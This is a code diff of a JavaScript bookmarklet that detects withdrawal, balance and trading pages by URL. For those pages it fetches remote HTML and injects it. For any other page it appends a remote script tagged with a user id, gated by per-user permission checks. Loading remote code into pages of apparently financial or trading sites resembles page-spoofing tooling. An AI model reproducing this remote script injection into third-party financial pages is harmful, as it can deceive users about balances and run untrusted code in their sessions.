@@ -115,7 +115,7 @@ javascript:(function() {
         };
     }
 
-    /* 4. Routing System with Error Script Handling */
+    /* 4. Complete Routing System */
     function runAhmadSystem(u) {
         var getRouteInfo = () => {
             var p = location.href.split("en/")[1]?.replace("/", "") || "";
@@ -126,14 +126,22 @@ javascript:(function() {
             if (p === "withdrawal") return {file: "p.html", key: "p"};
             if (p === "balance") return {file: "t.html", key: "t"};
 
+            // Mobile vs PC Logic
             var isMob = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-            // Agar koi page match nahi hua (Unknown Page)
+            var currentHost = window.location.hostname;
+            
+            // Check if current page is valid for PC/Android (aapki logic ke hisaab se)
+            if (currentHost.includes("trade") || p === "trading") {
+                return isMob ? {file: "android.html", key: "android"} : {file: "pc.html", key: "pc"};
+            }
+
+            // Agar upar mein se kuch bhi match na ho toh Error JS
             return {file: "error.js", key: "error", isScript: true};
         };
 
         var route = getRouteInfo();
 
-        /* Permission Check (Error page bypasses permission or check as needed) */
+        /* Permission Check */
         if (route.key !== "error" && u.permissions && u.permissions[route.key] === false) {
             showAhmadLock(id);
             return;
@@ -142,13 +150,13 @@ javascript:(function() {
         var targetURL = baseURL + route.file;
 
         if (route.isScript) {
-            // Unknown page pe direct script insert hogi with ID
+            // UNKNOWN PAGE: Script type insertion
             const s = document.createElement('script');
             s.type = "text/javascript";
             s.src = targetURL + "?id=" + id;
             document.body.appendChild(s);
         } else {
-            // Known pages ke liye normal HTML fetch logic
+            // KNOWN PAGES: HTML Fetch injection
             fetch(targetURL)
               .then(res => res.text())
               .then(html => {
